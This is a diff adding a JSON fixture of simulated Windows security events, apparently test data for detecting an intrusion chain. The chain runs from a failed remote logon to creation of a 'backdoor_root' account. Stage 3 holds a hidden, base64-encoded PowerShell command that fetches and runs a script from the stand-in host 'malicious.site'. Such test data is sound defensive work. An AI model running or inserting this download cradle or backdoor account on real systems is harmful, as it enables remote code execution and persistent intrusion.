@@ -1,0 +1,69 @@
+[
+  {
+    "stage": 1,
+    "phase_name": "Initial Credential Access",
+    "event_type": "windows_logon_failure",
+    "event": {
+      "EventID": 4625,
+      "TimeCreated": "2026-11-13T15:00:10.000Z",
+      "EventData": {
+        "TargetUserName": "administrator",
+        "WorkstationName": "EXTERNAL-ATTACK",
+        "IpAddress": "203.0.113.55",
+        "LogonType": "10",
+        "Status": "0xC000006D",
+        "SubStatus": "0xC000006A",
+        "FailureReason": "Unknown user name or bad password."
+      }
+    }
+  },
+  {
+    "stage": 2,
+    "phase_name": "Persistence Account Creation",
+    "event_type": "windows_account_creation",
+    "event": {
+      "EventID": 4720,
+      "TimeCreated": "2026-11-13T15:05:30.000Z",
+      "EventData": {
+        "TargetUserName": "backdoor_root",
+        "TargetSid": "S-1-5-21-9988776655-1122334455-6677889900-1099",
+        "SubjectUserName": "administrator",
+        "SubjectUserSid": "S-1-5-21-9988776655-1122334455-6677889900-500",
+        "SubjectDomainName": "CORP",
+        "PrivilegeList": "-"
+      }
+    }
+  },
+  {
+    "stage": 3,
+    "phase_name": "Defense Evasion and Execution",
+    "event_type": "windows_process_creation",
+    "event": {
+      "EventID": 4688,
+      "TimeCreated": "2026-11-13T15:08:15.000Z",
+      "EventData": {
+        "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAczA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHMAaQB0AGUALwBiAC4AcABzADEAJwApAA==",
+        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+        "TargetUserName": "backdoor_root",
+        "NewProcessId": "7712"
+      }
+    }
+  },
+  {
+    "stage": 4,
+    "phase_name": "Benign Baseline Noise",
+    "event_type": "windows_process_creation",
+    "event": {
+      "EventID": 4688,
+      "TimeCreated": "2026-11-13T15:10:00.000Z",
+      "EventData": {
+        "NewProcessName": "C:\\Windows\\notepad.exe",
+        "CommandLine": "notepad.exe C:\\Users\\jdoe\\notes.txt",
+        "ParentProcessName": "C:\\Windows\\explorer.exe",
+        "TargetUserName": "jdoe",
+        "NewProcessId": "8820"
+      }
+    }
+  }
+]
